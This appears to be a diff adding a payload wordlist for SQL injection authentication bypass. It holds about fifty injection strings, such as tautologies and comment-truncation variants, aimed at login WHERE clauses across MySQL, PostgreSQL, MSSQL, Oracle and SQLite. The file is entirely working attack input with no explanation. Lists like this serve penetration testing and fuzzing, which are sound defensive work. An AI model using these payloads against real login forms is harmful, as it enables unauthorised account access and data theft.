@@ -1,0 +1,51 @@
+# SQL Injection - Authentication Bypass
+# Classic login bypass payloads targeting WHERE clause manipulation
+# Covers MySQL, PostgreSQL, MSSQL, Oracle, SQLite
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'/*
+' OR '1'='1'#
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin' --
+admin'#
+admin'/*
+admin' #
+admin' /*
+' OR 'x'='x
+' OR ''='
+') OR ('1'='1
+') OR ('1'='1'--
+') OR ('1'='1'#
+')) OR (('1'='1
+")) OR (("1"="1
+" OR "1"="1"--
+" OR "1"="1"#
+" OR "1"="1"/*
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1#
+1' OR '1'='1
+1' OR 1=1--
+1' OR 1=1#
+' OR 'a'='a
+' OR 'a'='a'--
+' OR 'a'='a'#
+or 1=1--
+or 1=1#
+' OR 1 LIKE 1--
+' OR 1 LIKE 1#
+' OR 2>1--
+' OR 1<2--
+'='
+'LIKE'
+' OR 1=1--+
+' OR 1=1-- -
+') OR 1=1--
+') OR 1=1#
+admin' OR '1'='1
+admin') OR ('1'='1'--
+' OR 1=1;--
+' OR 1--
+' OR 1#
